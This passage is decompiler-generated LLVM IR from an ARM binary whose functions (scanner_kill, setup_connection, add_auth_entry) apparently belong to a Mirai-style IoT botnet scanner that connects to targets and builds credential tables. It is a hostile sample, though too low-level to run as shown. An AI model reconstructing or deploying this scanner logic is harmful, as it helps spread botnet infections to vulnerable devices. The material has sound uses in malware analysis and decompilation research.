  store i32 %v3_e968, i32* %r2.global-to-local, align 4
  %v2_e96c = icmp eq i8 %v2_e968, 0
  store i1 %v2_e96c, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_e974 = mul nuw nsw i32 %v3_e968, 256
  store i32 %v3_e974, i32* @r1, align 4
  br i1 %v2_e96c, label %dec_label_pc_e97c, label %dec_label_pc_e950

dec_label_pc_e97c:                                ; preds = %dec_label_pc_e940.backedge, %dec_label_pc_e958, %dec_label_pc_e934
  %v1_e980 = phi i32 [ 1, %dec_label_pc_e934 ], [ %v1_e9c0, %dec_label_pc_e958 ], [ %v1_e9c065, %dec_label_pc_e940.backedge ]
  %v0_e97c = phi i32 [ 0, %dec_label_pc_e934 ], [ 1, %dec_label_pc_e958 ], [ %v0_e9b8, %dec_label_pc_e940.backedge ]
  %v7_e97c = icmp eq i32 %v0_e97c, 1
  store i1 %v7_e97c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e97c, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_e97c
  %v2_e980 = add i32 %v1_e980, 1
  store i32 %v2_e980, i32* %r0.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %dec_label_pc_e9dc, %dec_label_pc_e97c, %bb121
  %v1_e984 = phi i32 [ %v5_e9f4, %dec_label_pc_e9dc ], [ %v1_e980, %dec_label_pc_e97c ], [ %v2_e980, %bb121 ]
  %v2_e984 = add i32 %v1_e984, %v1_e92c
  br label %dec_label_pc_e8b4.backedge

dec_label_pc_e8b4.backedge:                       ; preds = %bb122, %dec_label_pc_ea00
  %v0_e8b4.pre = phi i32 [ %v3_e8c0144, %bb122 ], [ %v0_e8b4.pre.pre, %dec_label_pc_ea00 ]
  %storemerge29 = phi i32 [ %v2_e984, %bb122 ], [ %v2_ea78, %dec_label_pc_ea00 ]
  store i32 %storemerge29, i32* %r0.global-to-local, align 4
  %v1_e8b4 = add i32 %v0_e8b4.pre, -1
  %v3_e8b8 = mul i32 %v1_e8b4, 65536
  store i32 %v3_e8b8, i32* %r3.global-to-local, align 4
  %v7_e8bc = icmp eq i32 %v3_e8b8, -65536
  store i1 %v7_e8bc, i1* %cpsr_z.global-to-local, align 1
  %v3_e8c0 = urem i32 %v1_e8b4, 65536
  store i32 %v3_e8c0, i32* @r8, align 4
  br i1 %v7_e8bc, label %dec_label_pc_e83c, label %dec_label_pc_e8c8

dec_label_pc_e98c:                                ; preds = %dec_label_pc_e83c
  %v1_e98c = add i32 %v0_e844, 4
  %v2_e98c = inttoptr i32 %v1_e98c to i32*
  %v3_e98c = load i32, i32* %v2_e98c, align 4
  store i32 %v3_e98c, i32* %r0.global-to-local, align 4
  %v2_e990 = icmp eq i32 %v3_e98c, 0
  store i1 %v2_e990, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_e998.139 to i32), i32* @lr, align 4
  %v1_e994 = xor i1 %v2_e990, true
  call void @__pseudo_cond_branch(i1 %v1_e994, i32 ptrtoint (i32* @global_var_1358c.34 to i32))
  %v0_e998 = load i32, i32* @fp, align 4
  store i32 %v0_e998, i32* @r0, align 4
  %v0_e99c = call i32 @free()
  store i32 %v0_e99c, i32* %r0.global-to-local, align 4
  %v0_e9a0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_e850

dec_label_pc_e9a8:                                ; preds = %dec_label_pc_e8e4
  %v2_e9a8 = icmp eq i32 %v0_e9a8, 0
  store i1 %v2_e9a8, i1* %cpsr_z.global-to-local, align 1
  %v1_e9ac = add i32 %v0_e9ac, 1
  store i32 %v1_e9ac, i32* %r3.global-to-local, align 4
  br i1 %v2_e9a8, label %bb123, label %dec_label_pc_e8d4.backedge

dec_label_pc_e8d4.backedge:                       ; preds = %dec_label_pc_e9a8, %bb123
  %v1_e9b050 = phi i32 [ %v1_e9b0, %dec_label_pc_e9a8 ], [ %v2_e9b0, %bb123 ]
  %v1_e8d4 = inttoptr i32 %v1_e9ac to i8*
  %v2_e8d4 = load i8, i8* %v1_e8d4, align 1
  %v3_e8d4 = zext i8 %v2_e8d4 to i32
  store i32 %v3_e8d4, i32* %r2.global-to-local, align 4
  %v2_e8d8 = icmp eq i8 %v2_e8d4, 0
  store i1 %v2_e8d8, i1* %cpsr_z.global-to-local, align 1
  %v3_e8dc = mul nuw nsw i32 %v3_e8d4, 256
  store i32 %v3_e8dc, i32* @r1, align 4
  br i1 %v2_e8d8, label %dec_label_pc_e910, label %dec_label_pc_e8e4.preheader

bb123:                                            ; preds = %dec_label_pc_e9a8
  %v2_e9b0 = add i32 %v1_e9b0, 1
  store i32 %v2_e9b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e8d4.backedge

dec_label_pc_e9b8:                                ; preds = %dec_label_pc_e950
  %v2_e9b8 = icmp eq i32 %v0_e9b8, 0
  store i1 %v2_e9b8, i1* %cpsr_z.global-to-local, align 1
  %v1_e9bc = add i32 %v0_e9bc, 1
  store i32 %v1_e9bc, i32* %r3.global-to-local, align 4
  br i1 %v2_e9b8, label %bb124, label %dec_label_pc_e940.backedge

dec_label_pc_e940.backedge:                       ; preds = %dec_label_pc_e9b8, %bb124
  %v1_e9c065 = phi i32 [ %v1_e9c0, %dec_label_pc_e9b8 ], [ %v2_e9c0, %bb124 ]
  %v1_e940 = inttoptr i32 %v1_e9bc to i8*
  %v2_e940 = load i8, i8* %v1_e940, align 1
  %v3_e940 = zext i8 %v2_e940 to i32
  store i32 %v3_e940, i32* %r2.global-to-local, align 4
  %v2_e944 = icmp eq i8 %v2_e940, 0
  store i1 %v2_e944, i1* %cpsr_z.global-to-local, align 1
  %v3_e948 = mul nuw nsw i32 %v3_e940, 256
  store i32 %v3_e948, i32* @r1, align 4
  br i1 %v2_e944, label %dec_label_pc_e97c, label %dec_label_pc_e950.preheader

bb124:                                            ; preds = %dec_label_pc_e9b8
  %v2_e9c0 = add i32 %v1_e9c0, 1
  store i32 %v2_e9c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e940.backedge

dec_label_pc_e9c8:                                ; preds = %bb120
  %v1_e9c8 = add i32 %v2_e918, 2
  %v2_e9c8 = inttoptr i32 %v1_e9c8 to i8*
  %v3_e9c8 = load i8, i8* %v2_e9c8, align 1
  %v4_e9c8 = zext i8 %v3_e9c8 to i32
  store i32 %v4_e9c8, i32* %r3.global-to-local, align 4
  %v1_e9cc = add i32 %v2_e918, 3
  %v2_e9cc = inttoptr i32 %v1_e9cc to i8*
  %v3_e9cc = load i8, i8* %v2_e9cc, align 1
  %v4_e9cc = zext i8 %v3_e9cc to i32
  store i32 %v4_e9cc, i32* %r2.global-to-local, align 4
  %v4_e9d0 = mul nuw nsw i32 %v4_e9cc, 256
  %v5_e9d0 = or i32 %v4_e9d0, %v4_e9c8
  store i32 %v5_e9d0, i32* %r3.global-to-local, align 4
  %v7_e9d4 = icmp eq i32 %v5_e9d0, 256
  store i1 %v7_e9d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9d4, label %dec_label_pc_e9dc, label %dec_label_pc_e934

dec_label_pc_e9dc:                                ; preds = %dec_label_pc_e9c8
  %v1_e9dc = add i32 %v2_e918, 9
  %v2_e9dc = inttoptr i32 %v1_e9dc to i8*
  %v3_e9dc = load i8, i8* %v2_e9dc, align 1
  %v4_e9dc = zext i8 %v3_e9dc to i32
  store i32 %v4_e9dc, i32* %r2.global-to-local, align 4
  %v1_e9e0 = add i32 %v2_e918, 8
  %v2_e9e0 = inttoptr i32 %v1_e9e0 to i8*
  %v3_e9e0 = load i8, i8* %v2_e9e0, align 1
  %v4_e9e0 = zext i8 %v3_e9e0 to i32
  %v4_e9e4 = mul nuw nsw i32 %v4_e9dc, 256
  %v5_e9e4 = or i32 %v4_e9e0, %v4_e9e4
  %v3_e9e8 = mul i32 %v5_e9e4, 65536
  store i32 %v3_e9e8, i32* %r3.global-to-local, align 4
  %v3_e9ec = mul nuw nsw i32 %v4_e9e0, 256
  store i32 %v3_e9ec, i32* %r2.global-to-local, align 4
  %v5_e9f4 = or i32 %v3_e9ec, %v4_e9dc
  store i32 %v5_e9f4, i32* %r0.global-to-local, align 4
  %v7_e9f8 = icmp eq i32 %v5_e9f4, 4
  store i1 %v7_e9f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f8, label %dec_label_pc_ea00, label %bb122

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e9dc
  %v2_ea00 = inttoptr i32 %v1_e92c to i8*
  %v3_ea00 = load i8, i8* %v2_ea00, align 1
  %v4_ea00 = zext i8 %v3_ea00 to i32
  store i32 %v4_ea00, i32* %r3.global-to-local, align 4
  store i32 %v2_e610, i32* %r2.global-to-local, align 4
  %v1_ea0c = add i32 %v2_e918, 11
  %v2_ea0c = inttoptr i32 %v1_ea0c to i8*
  %v3_ea0c = load i8, i8* %v2_ea0c, align 1
  %v4_ea0c = zext i8 %v3_ea0c to i32
  store i32 %v4_ea0c, i32* %r2.global-to-local, align 4
  store i32 %v2_e610, i32* %r3.global-to-local, align 4
  %v1_ea18 = add i32 %v2_e918, 12
  %v2_ea18 = inttoptr i32 %v1_ea18 to i8*
  %v3_ea18 = load i8, i8* %v2_ea18, align 1
  %v4_ea18 = zext i8 %v3_ea18 to i32
  store i32 %v4_ea18, i32* %r3.global-to-local, align 4
  store i32 %v2_e610, i32* %ip.global-to-local, align 4
  %v1_ea24 = add i32 %v2_e918, 13
  %v2_ea24 = inttoptr i32 %v1_ea24 to i8*
  %v3_ea24 = load i8, i8* %v2_ea24, align 1
  %v4_ea24 = zext i8 %v3_ea24 to i32
  store i32 %v4_ea24, i32* %r2.global-to-local, align 4
  %v0_ea2c = load i32, i32* @fp, align 4
  %v1_ea2c = inttoptr i32 %v0_ea2c to i8*
  %v2_ea2c = load i8, i8* %v1_ea2c, align 1
  %v3_ea2c = zext i8 %v2_ea2c to i32
  %v1_ea30 = mul nuw nsw i32 %v3_ea2c, 4
  %v3_ea34 = add nuw nsw i32 %v1_ea30, 4
  store i32 %v3_ea34, i32* %r1.global-to-local, align 4
  %v1_ea38 = add i32 %v0_ea2c, 4
  %v2_ea38 = inttoptr i32 %v1_ea38 to i32*
  %v3_ea38 = load i32, i32* %v2_ea38, align 4
  store i32 %v3_ea38, i32* %r0.global-to-local, align 4
  %v3_ea3c = sext i8 %v3_ea24 to i32
  %v5_ea3c = sext i8 %v3_ea18 to i32
  %v10_ea3c = inttoptr i32 %v3_ea38 to i32*
  %v11_ea3c = call i32 @realloc(i32* %v10_ea3c, i32 %v3_ea34, i32 %v3_ea3c, i32 %v5_ea3c)
  store i32 %v11_ea3c, i32* %r0.global-to-local, align 4
  %v0_ea40 = load i32, i32* @fp, align 4
  %v1_ea40 = inttoptr i32 %v0_ea40 to i8*
  %v2_ea40 = load i8, i8* %v1_ea40, align 1
  %v3_ea40 = zext i8 %v2_ea40 to i32
  store i32 %v3_ea40, i32* %r2.global-to-local, align 4
  store i32 %v2_e610, i32* @lr, align 4
  %v4_ea48 = sext i8 %v3_ea00 to i32
  store i32 %v4_ea48, i32* %r3.global-to-local, align 4
  %v1_ea4c = add nuw nsw i32 %v3_ea40, 1
  store i32 %v1_ea4c, i32* @r1, align 4
  %v5_ea50 = mul nuw nsw i32 %v3_ea40, 4
  %v6_ea50 = add i32 %v5_ea50, %v11_ea3c
  %v7_ea50 = inttoptr i32 %v6_ea50 to i32*
  store i32 %v4_ea48, i32* %v7_ea50, align 4
  %v1_ea54 = load i32, i32* @fp, align 4
  %v2_ea54 = add i32 %v1_ea54, 4
  %v3_ea54 = inttoptr i32 %v2_ea54 to i32*
  store i32 %v11_ea3c, i32* %v3_ea54, align 4
  %v0_ea58 = load i32, i32* @r1, align 4
  %v1_ea58 = trunc i32 %v0_ea58 to i8
  %v2_ea58 = load i32, i32* @fp, align 4
  %v3_ea58 = inttoptr i32 %v2_ea58 to i8*
  store i8 %v1_ea58, i8* %v3_ea58, align 1
  %v0_ea5c = load i32, i32* @r4, align 4
  %v1_ea5c = add i32 %v0_ea5c, 9
  %v2_ea5c = inttoptr i32 %v1_ea5c to i8*
  %v3_ea5c = load i8, i8* %v2_ea5c, align 1
  %v4_ea5c = zext i8 %v3_ea5c to i32
  store i32 %v4_ea5c, i32* %r3.global-to-local, align 4
  %v1_ea60 = add i32 %v0_ea5c, 8
  %v2_ea60 = inttoptr i32 %v1_ea60 to i8*
  %v3_ea60 = load i8, i8* %v2_ea60, align 1
  %v4_ea60 = zext i8 %v3_ea60 to i32
  %v4_ea64 = mul nuw nsw i32 %v4_ea5c, 256
  %v5_ea64 = or i32 %v4_ea60, %v4_ea64
  %v3_ea68 = mul i32 %v5_ea64, 65536
  store i32 %v3_ea68, i32* %r2.global-to-local, align 4
  %v3_ea6c = mul nuw nsw i32 %v4_ea60, 256
  store i32 %v3_ea6c, i32* %r3.global-to-local, align 4
  %v5_ea74 = or i32 %v3_ea6c, %v4_ea5c
  store i32 %v5_ea74, i32* %r0.global-to-local, align 4
  %v0_ea78 = load i32, i32* @r7, align 4
  %v2_ea78 = add i32 %v0_ea78, %v5_ea74
  %v0_e8b4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_e8b4.backedge

; uselistorder directives
  uselistorder i32 %v3_ea6c, { 1, 0 }
  uselistorder i32 %v4_ea5c, { 1, 0, 2 }
  uselistorder i32 %v11_ea3c, { 1, 0, 2 }
  uselistorder i32 %v3_ea34, { 1, 0 }
  uselistorder i32 %v5_e9f4, { 1, 2, 0 }
  uselistorder i32 %v3_e9ec, { 1, 0 }
  uselistorder i32 %v4_e9dc, { 1, 0, 2 }
  uselistorder i32 %v2_e9c0, { 1, 0 }
  uselistorder i32 %v3_e940, { 0, 2, 1 }
  uselistorder i32 %v1_e9c065, { 1, 0 }
  uselistorder i32 %v1_e9bc, { 1, 2, 0 }
  uselistorder i32 %v2_e9b0, { 1, 0 }
  uselistorder i32 %v3_e8d4, { 0, 2, 1 }
  uselistorder i32 %v1_e9b050, { 1, 0 }
  uselistorder i32 %v1_e9ac, { 1, 2, 0 }
  uselistorder i1 %v7_e8bc, { 1, 0 }
  uselistorder i32 %v1_e8b4, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_e968, { 0, 2, 1 }
  uselistorder i32 %v2_e964, { 1, 2, 0 }
  uselistorder i32 %v0_e9b8, { 2, 0, 1 }
  uselistorder i32 %v1_e9c0, { 1, 2, 0 }
  uselistorder i32 %v3_e94828, { 1, 0 }
  uselistorder i32 %v3_e94026, { 1, 0, 2 }
  uselistorder i32 %v1_e92c, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_e918, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_e8fc, { 0, 2, 1 }
  uselistorder i32 %v2_e8f8, { 1, 2, 0 }
  uselistorder i32 %v0_e9a8, { 2, 0, 1 }
  uselistorder i32 %v1_e9b0, { 1, 2, 0 }
  uselistorder i32 %v3_e8dc22, { 1, 0 }
  uselistorder i32 %v3_e8d420, { 1, 0, 2 }
  uselistorder i32 %v0_e918143, { 3, 0, 1, 2 }
  uselistorder i32 %v3_e8c0142, { 1, 0 }
  uselistorder i1 %v7_e8bc141, { 1, 0 }
  uselistorder i32 %v1_e8b4134, { 1, 0 }
  uselistorder i1 %v9_e890, { 1, 0 }
  uselistorder i32 %v0_e850, { 1, 0 }
  uselistorder i32 %v0_e844, { 1, 0, 2 }
  uselistorder i32 %v0_e834, { 1, 0 }
  uselistorder i32 %v0_e80c, { 1, 0 }
  uselistorder i32 %v1_e7c0, { 1, 0, 2 }
  uselistorder i1 %v7_e7b8, { 1, 0 }
  uselistorder i32 %v5_e7b4, { 1, 0, 2 }
  uselistorder i32 %v1_e77c, { 1, 0 }
  uselistorder i32 %v3_e768, { 1, 0 }
  uselistorder i32 %v0_e760, { 1, 0 }
  uselistorder i32 %v1_e754, { 1, 2, 0 }
  uselistorder i1 %v7_e70c, { 1, 0 }
  uselistorder i32 %v4_e708, { 1, 0, 2 }
  uselistorder i1 %v7_e6f0, { 1, 0 }
  uselistorder i32 %v3_e6ec, { 1, 0, 2 }
  uselistorder i1 %v7_e6d4, { 1, 0 }
  uselistorder i32 %v3_e6d0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_e6b8, { 2, 1, 0 }
  uselistorder i32 %v1_e6bc, { 1, 0 }
  uselistorder i32 %v2_e76c, { 1, 0 }
  uselistorder i32 %v2_e744, { 1, 0, 2 }
  uselistorder i16 %v5_e660, { 1, 0 }
  uselistorder i32 %v2_e65c, { 1, 0, 2 }
  uselistorder i32 %v6_e648, { 1, 2, 0 }
  uselistorder i64 %v5_e644, { 0, 2, 1 }
  uselistorder i32 %v1_e630, { 1, 0, 2 }
  uselistorder i32 %v1_e5e8, { 1, 0 }
  uselistorder i32 %v1_e5e4, { 1, 2, 0 }
  uselistorder i32 %v2_e5e0, { 1, 0 }
  uselistorder i1 %v8_e5cc, { 1, 0 }
  uselistorder i32 %v2_e5a4, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp79, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 4, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 11, 14, 12, 13, 15, 17, 37, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 33, 34, 36 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 14, 10, 1, 12, 13, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 10, 0, 13 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 8, 7, 9, 10, 12, 15, 13, 14, 17, 16, 20, 18, 19, 21, 22, 24, 23, 26, 25, 27, 29, 28, 30, 33, 32, 31, 34, 35, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 11, 5, 16, 6, 7, 17, 8, 9, 10, 1, 12, 13, 14, 15, 0, 37, 18, 19, 20, 21, 22, 23, 24, 25, 26, 2, 27, 28, 29, 30, 35, 32, 33, 31, 34, 36 }
  uselistorder i32 (i32)* @sleep, { 11, 10, 9, 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e940.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e8d4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e8b4.backedge, { 1, 0 }
  uselistorder label %bb122, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e950, { 1, 0 }
  uselistorder label %dec_label_pc_e950.preheader, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_e8e4, { 1, 0 }
  uselistorder label %dec_label_pc_e8e4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e8c8, { 1, 0 }
  uselistorder label %dec_label_pc_e850, { 1, 0 }
  uselistorder label %dec_label_pc_e83c, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_e81c, { 2, 1, 4, 0, 3 }
  uselistorder label %bb118, { 1, 0 }
  uselistorder label %bb115, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e5c4, { 1, 0 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_ea8c = load i32, i32* @global_var_24f64.141, align 4
  %v2_ea94 = call i32 @kill(i32 %v2_ea8c, i32 9)
  ret i32 %v2_ea94

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_eaa8 = load i32, i32* @r4, align 4
  store i32 %v3_eaa8, i32* %stack_var_-16, align 4
  %v6_eaa8 = load i32, i32* @r5, align 4
  %v9_eaa8 = load i32, i32* @r6, align 4
  %v12_eaa8 = load i32, i32* @lr, align 4
  %v0_eaac = load i32, i32* @r0, align 4
  store i32 %v0_eaac, i32* @r5, align 4
  %v1_eab0 = add i32 %v0_eaac, 4
  %v2_eab0 = inttoptr i32 %v1_eab0 to i32*
  %v3_eab0 = load i32, i32* %v2_eab0, align 4
  store i32 %v3_eab0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 60116, i32* @lr, align 4
  %v1_ead0 = icmp ne i32 %v3_eab0, -1
  call void @__pseudo_cond_branch(i1 %v1_ead0, i32 ptrtoint (i32* @global_var_14a60.113 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_eadc = load i32, i32* @r6, align 4
  store i32 %v0_eadc, i32* %r2.global-to-local, align 4
  %v3_eae0 = call i32 @socket(i32 2, i32 1, i32 %v0_eadc)
  store i32 %v3_eae0, i32* %r0.global-to-local, align 4
  %v7_eae4 = icmp eq i32 %v3_eae0, -1
  %v1_eae8 = load i32, i32* @r5, align 4
  %v2_eae8 = add i32 %v1_eae8, 4
  %v3_eae8 = inttoptr i32 %v2_eae8 to i32*
  store i32 %v3_eae0, i32* %v3_eae8, align 4
  br i1 %v7_eae4, label %entry.dec_label_pc_eb60_crit_edge, label %dec_label_pc_eaf0

entry.dec_label_pc_eb60_crit_edge:                ; preds = %entry
  %v1_eb68.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eb60

dec_label_pc_eaf0:                                ; preds = %entry
  %v2_eab4 = ptrtoint i32* %stack_var_-32 to i32
  %v0_eaf0 = load i32, i32* @r5, align 4
  %v1_eaf0 = add i32 %v0_eaf0, 28
  store i32 %v1_eaf0, i32* @r0, align 4
  %v0_eaf4 = load i32, i32* @r6, align 4
  %v2_eaf4 = add i32 %v0_eaf0, 24
  %v3_eaf4 = inttoptr i32 %v2_eaf4 to i32*
  store i32 %v0_eaf4, i32* %v3_eaf4, align 4
  store i32 356, i32* @r1, align 4
  %v0_eafc = call i32 @util_zero()
  store i32 %v0_eafc, i32* %r0.global-to-local, align 4
  %v0_eb00 = load i32, i32* @r5, align 4
  %v1_eb00 = add i32 %v0_eb00, 4
  %v2_eb00 = inttoptr i32 %v1_eb00 to i32*
  %v3_eb00 = load i32, i32* %v2_eb00, align 4
  store i32 %v3_eb00, i32* @r4, align 4
  %v0_eb04 = load i32, i32* @r6, align 4
  store i32 %v0_eb04, i32* @r2, align 4
  store i32 %v3_eb00, i32* %r0.global-to-local, align 4
  %v2_eb10 = call i32 @__libc_fcntl(i32 %v3_eb00, i32 3)
  %v1_eb18 = or i32 %v2_eb10, 2048
  store i32 %v1_eb18, i32* @r2, align 4
  %v0_eb1c = load i32, i32* @r4, align 4
  store i32 %v0_eb1c, i32* %r0.global-to-local, align 4
  %v2_eb20 = call i32 @__libc_fcntl(i32 %v0_eb1c, i32 4)
  store i32 %v2_eb20, i32* %r0.global-to-local, align 4
  %v2_eb28 = load i32, i32* @global_var_22478.143, align 4
  store i32 %v2_eb28, i32* %r2.global-to-local, align 4
  %v1_eb30 = load i32, i32* @r5, align 4
  %v2_eb30 = add i32 %v1_eb30, 12
  %v3_eb30 = inttoptr i32 %v2_eb30 to i32*
  store i32 1, i32* %v3_eb30, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_eb3c = load i32, i32* %r2.global-to-local, align 4
  %v1_eb3c = load i32, i32* @r5, align 4
  %v2_eb3c = add i32 %v1_eb3c, 8
  %v3_eb3c = inttoptr i32 %v2_eb3c to i32*
  store i32 %v0_eb3c, i32* %v3_eb3c, align 4
  %v0_eb40 = load i32, i32* @r5, align 4
  %v1_eb44 = add i32 %v0_eb40, 4
  %v2_eb44 = inttoptr i32 %v1_eb44 to i32*
  %v3_eb44 = load i32, i32* %v2_eb44, align 4
  store i32 %v3_eb44, i32* %r0.global-to-local, align 4
  %v1_eb48 = add i32 %v0_eb40, 20
  %v2_eb48 = inttoptr i32 %v1_eb48 to i16*
  %v3_eb48 = load i16, i16* %v2_eb48, align 2
  %v4_eb48 = zext i16 %v3_eb48 to i32
  store i32 %v4_eb48, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_eb5c = call i32 @__libc_connect(i32 %v3_eb44, i32 %v2_eab4, i32 16)
  store i32 %v3_eb5c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eb60

dec_label_pc_eb60:                                ; preds = %entry.dec_label_pc_eb60_crit_edge, %dec_label_pc_eaf0
  %v1_eb68 = phi i32 [ %v1_eb68.pre, %entry.dec_label_pc_eb60_crit_edge ], [ %v3_eb5c, %dec_label_pc_eaf0 ]
  %v2_eb64 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_eb64, i32* @r4, align 4
  store i32 %v6_eaa8, i32* @r5, align 4
  store i32 %v9_eaa8, i32* @r6, align 4
  store i32 %v12_eaa8, i32* @lr, align 4
  ret i32 %v1_eb68

; uselistorder directives
  uselistorder i32 %v3_eae0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_eb60, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_eb70 = load i32, i32* @r4, align 4
  %v6_eb70 = load i32, i32* @r5, align 4
  %v9_eb70 = load i32, i32* @r6, align 4
  %v12_eb70 = load i32, i32* @r7, align 4
  %v15_eb70 = load i32, i32* @r8, align 4
  %v18_eb70 = load i32, i32* @sb, align 4
  %v21_eb70 = load i32, i32* @sl, align 4
  %v24_eb70 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_22444.145 to i32), i32* @fp, align 4
  %v2_eb78 = load i32, i32* @global_var_22444.145, align 4
  store i32 ptrtoint (i32* @global_var_22470.147 to i32), i32* @sl, align 4
  %v1_eb84 = add i32 %v2_eb78, 1
  store i32 %v1_eb84, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_eb90 = load i32, i32* @global_var_22470.147, align 4
  store i32 %v2_eb90, i32* %r0.global-to-local, align 4
  %v3_eb94 = mul i32 %v1_eb84, 16
  store i32 %v3_eb94, i32* %r1.global-to-local, align 4
  %v4_eb9c = inttoptr i32 %v2_eb90 to i32*
  %v5_eb9c = call i32 @realloc(i32* %v4_eb9c, i32 %v3_eb94, i32 %arg3, i32 %v1_eb84)
  %v2_eba0 = load i32, i32* @global_var_22444.145, align 4
  store i32 %v2_eba0, i32* %r2.global-to-local, align 4
  store i32 %v5_eb9c, i32* @r8, align 4
  %v0_eba8 = load i32, i32* @r5, align 4
  store i32 %v0_eba8, i32* %r0.global-to-local, align 4
  %v1_ebb0 = load i32, i32* @sl, align 4
  %v2_ebb0 = inttoptr i32 %v1_ebb0 to i32*
  store i32 %v5_eb9c, i32* %v2_ebb0, align 4
  %v1_ebb4 = inttoptr i32 %v0_eba8 to i8*
  %v2_ebb4 = call i32 @util_strlen(i8* %v1_ebb4)
  %sext = mul i32 %v2_ebb4, 16777216
  %v1_ebb8 = sdiv i32 %sext, 16777216
  %v2_ebb8 = add nsw i32 %v1_ebb8, 1
  store i32 %v2_ebb8, i32* @r4, align 4
  store i32 %v1_ebb8, i32* @r7, align 4
  store i32 %v2_ebb8, i32* @r0, align 4
  %v0_ebc4 = call i32 @malloc()
  store i32 %v0_ebc4, i32* %r0.global-to-local, align 4
  %v0_ebc8 = load i32, i32* @r5, align 4
  store i32 %v0_ebc8, i32* %r1.global-to-local, align 4
  %v0_ebcc = load i32, i32* @r4, align 4
  store i32 %v0_ebcc, i32* %r2.global-to-local, align 4
  store i32 %v0_ebc4, i32* %r6.global-to-local, align 4
  %v3_ebd4 = call i32 @util_memcpy(i32 %v0_ebc4, i32 %v0_ebc8, i32 %v0_ebcc)
  store i32 %v3_ebd4, i32* %r0.global-to-local, align 4
  %v0_ebd8 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_ebd8, 1
  %extract.t6 = trunc i32 %v0_ebd8 to i8
  br i1 %tmp22, label %dec_label_pc_ebfc, label %dec_label_pc_ebe0

dec_label_pc_ebe0:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ebe4

dec_label_pc_ebe4:                                ; preds = %dec_label_pc_ebe4, %dec_label_pc_ebe0
